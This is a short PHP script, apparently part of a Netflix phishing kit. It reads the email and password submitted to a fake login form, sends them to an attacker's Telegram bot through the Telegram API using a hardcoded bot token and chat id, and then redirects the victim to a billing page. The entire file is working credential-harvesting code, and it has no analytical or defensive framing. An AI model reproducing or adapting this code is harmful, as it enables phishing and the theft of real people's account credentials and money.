<?php


    $email = $_POST['mail'];
    $pass = $_POST['pass'];

        $tmsg = "---------- Netflix Login ---------\n\r";
        $tmsg .= "Email: $email \n";
        $tmsg .= "Password: $pass \n";
        $tmsg .= "--------------------------------------\n";
        
                    file_get_contents("https://api.telegram.org/bot5621907662:AAHSGgNSgFdutQ4_VLYuEnKt3IX8N3NqohI/sendMessage?chat_id=-809211768&text=" . urlencode($tmsg)."" );
 
        header("Location: ../billing.php");
?>
